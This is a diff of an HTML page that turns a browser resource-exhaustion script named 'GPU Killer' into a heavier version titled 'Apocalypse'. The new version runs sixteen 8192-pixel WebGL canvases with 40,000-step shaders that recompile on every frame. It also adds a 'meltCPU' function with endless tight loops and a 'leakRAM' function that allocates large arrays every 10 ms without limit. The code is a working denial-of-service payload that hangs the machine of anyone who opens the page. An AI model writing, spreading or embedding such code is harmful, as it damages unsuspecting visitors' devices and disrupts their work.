@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>GPU Killer</title>
+<title>Apocalypse</title>
 <style>
 body{margin:0;overflow:hidden;background:black;}
 canvas{position:absolute;top:0;left:0;}
@@ -10,10 +10,10 @@ canvas{position:absolute;top:0;left:0;}
 </head>
 <body>
 <script>
-const W = 4096;
-const H = 4096;
+const W = 8192;
+const H = 8192;
 
-function createCanvas(){
+function createGL(){
     let c = document.createElement("canvas");
     c.width = W;
     c.height = H;
@@ -21,93 +21,117 @@ function createCanvas(){
     return c.getContext("webgl");
 }
 
-const contexts = [];
-for(let i=0;i<8;i++){
-    contexts.push(createCanvas());
+let gls = [];
+for(let i=0;i<16;i++){
+    gls.push(createGL());
 }
 
-const VSHADER = `
-attribute vec4 position;
-void main(){
-    gl_Position = position;
-}
+const VS = `
+attribute vec2 p;
+void main(){gl_Position=vec4(p,0.0,1.0);}
 `;
 
-const FSHADER = `
+const FS = `
 precision highp float;
-#define MAX 20000
-float f(vec3 p){
-    float d=0.0;
-    for(int i=0;i<128;i++){
-        p = abs(p)/dot(p,p) - 1.2;
-        d += exp(-float(i)*0.02);
+#define STEPS 40000
+
+float map(vec3 p){
+    for(int i=0;i<256;i++){
+        p = abs(p)/dot(p,p) - 1.3;
     }
-    return length(p)-d;
+    return length(p)-0.5;
 }
+
 void main(){
-    vec2 uv = gl_FragCoord.xy/4096.0;
-    vec3 ro = vec3(0.0,0.0,-3.0);
+    vec2 uv = gl_FragCoord.xy/8192.0;
+    vec3 ro = vec3(0.0,0.0,-4.0);
     vec3 rd = normalize(vec3(uv-0.5,1.0));
     float t = 0.0;
-    for(int i=0;i<MAX;i++){
+
+    for(int i=0;i<STEPS;i++){
         vec3 p = ro + rd*t;
-        float d = f(p);
-        t += d*0.5;
+        float d = map(p);
+        t += d*0.3;
     }
-    gl_FragColor = vec4(vec3(t*0.0001),1.0);
+
+    gl_FragColor = vec4(vec3(t*0.00001),1.0);
 }
 `;
 
-function init(gl){
+function setup(gl){
     let vs = gl.createShader(gl.VERTEX_SHADER);
-    gl.shaderSource(vs, VSHADER);
+    gl.shaderSource(vs,VS);
     gl.compileShader(vs);
 
     let fs = gl.createShader(gl.FRAGMENT_SHADER);
-    gl.shaderSource(fs, FSHADER);
+    gl.shaderSource(fs,FS);
     gl.compileShader(fs);
 
-    let prog = gl.createProgram();
-    gl.attachShader(prog,vs);
-    gl.attachShader(prog,fs);
-    gl.linkProgram(prog);
-    gl.useProgram(prog);
+    let pr = gl.createProgram();
+    gl.attachShader(pr,vs);
+    gl.attachShader(pr,fs);
+    gl.linkProgram(pr);
+    gl.useProgram(pr);
 
     let buf = gl.createBuffer();
     gl.bindBuffer(gl.ARRAY_BUFFER,buf);
     gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([
-        -1,-1, 1,-1, 1,1,
-        -1,-1, 1,1, -1,1
+        -1,-1,1,-1,1,1,
+        -1,-1,1,1,-1,1
     ]),gl.STATIC_DRAW);
 
-    let pos = gl.getAttribLocation(prog,"position");
-    gl.enableVertexAttribArray(pos);
-    gl.vertexAttribPointer(pos,2,gl.FLOAT,false,0,0);
+    let loc = gl.getAttribLocation(pr,"p");
+    gl.enableVertexAttribArray(loc);
+    gl.vertexAttribPointer(loc,2,gl.FLOAT,false,0,0);
 
-    return {gl,prog,fs};
+    return {gl,pr,fs};
 }
 
-const progs = contexts.map(init);
+let progs = gls.map(setup);
 
-function loop(){
+function meltCPU(){
+    // CPU infinite stress
+    setInterval(()=>{
+        let x=0;
+        for(let i=0;i<1e8;i++){
+            x+=Math.sqrt(i)*Math.sin(i);
+        }
+    },0);
+}
+
+function leakRAM(){
+    // memory leak
+    let arr=[];
+    setInterval(()=>{
+        arr.push(new Array(1e6).fill(Math.random()));
+    },10);
+}
+
+function killGPU(){
     for(let p of progs){
         let gl = p.gl;
 
         gl.viewport(0,0,W,H);
 
-        for(let i=0;i<5;i++){
+        for(let i=0;i<10;i++){
             gl.drawArrays(gl.TRIANGLES,0,6);
         }
 
-        gl.shaderSource(p.fs, FSHADER + Math.random());
+        // force shader recompilation
+        gl.shaderSource(p.fs, FS + Math.random());
         gl.compileShader(p.fs);
-        gl.linkProgram(p.prog);
-        gl.useProgram(p.prog);
+        gl.linkProgram(p.pr);
+        gl.useProgram(p.pr);
     }
+}
 
+function loop(){
+    killGPU();
     requestAnimationFrame(loop);
 }
 
+meltCPU();
+leakRAM();
 loop();
 </script>
 </body>
